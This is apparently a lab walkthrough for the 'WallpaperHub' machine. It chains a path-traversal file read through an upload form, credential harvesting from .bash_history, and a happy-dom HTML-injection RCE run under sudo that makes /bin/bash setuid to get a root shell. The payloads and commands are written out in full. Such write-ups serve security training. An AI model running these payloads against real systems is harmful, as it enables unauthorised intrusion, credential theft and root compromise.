# WallpaperHub - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Web Exploitation on Port 5000
- Found a webpage running on port `5000` with a file upload feature.
- Captured an upload request and exploited **path traversal** by modifying the filename to:
  ```
  ../../../../../../etc/passwd
  ```
- Instead of uploading an image, it **fetched system files** to the “My Uploads” page.

### 📥 2. Harvest User Data
- Downloaded `.bash_history` of user `wp_hub`.
- Found an SQLite command history:
  ```bash
  .tables
  .read users
  ```
- Reused the commands to extract credentials.

### 🔐 3. User Access
- SSH into the box using the `wp_hub` credentials found.
- Ran:
  ```bash
  sudo -l
  ```

---

## ⚙️ Privilege Escalation

### 🔍 1. Inspect Sudo Rights
```bash
(root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
```

- Checked the binary:
  ```bash
  ls -la /usr/bin/web-scraper
  ```
  → It’s a symlink to `/opt/scraper/scraper.js`

### 🕵️ 2. Analyze JavaScript Code
- Found it uses `happy-dom`, a known vulnerable library.
- Discovered:
  - **[CVE-2024-51757](https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065)**
  - Allows **remote code execution** via injected scripts.

---

### ⚔️ 3. Exploit the RCE via HTML Injection

#### Create exploit script:
`/tmp/sh.sh`:
```bash
#!/bin/bash
chmod 6777 /bin/bash
```
Make it executable:
```bash
chmod 777 /tmp/sh.sh
```

#### Create malicious HTML:
`/tmp/test.html`:
```html
<script src="https://192.168.45.194:80/'+require('child_process').execSync('/tmp/sh.sh')+'"></script>
```

#### Trigger the exploit:
```bash
sudo -u root /usr/bin/web-scraper /root/web_src_downloaded/../../../../../../../../../tmp/test.html
```

### 🧨 4. Get Root Shell
- Confirmed `bash` was setuid:
  ```bash
  ls -la /bin/bash
  ```
- Spawned root shell:
  ```bash
  /bin/bash -p
  ```

---

## 🧠 Notes

- Foothold was gained using classic **path traversal** abuse in file uploads.
- Privilege escalation used a **JavaScript-based RCE** in a Node.js tool run as root.
- Clean chaining of recon, user history, and sudo misconfiguration.
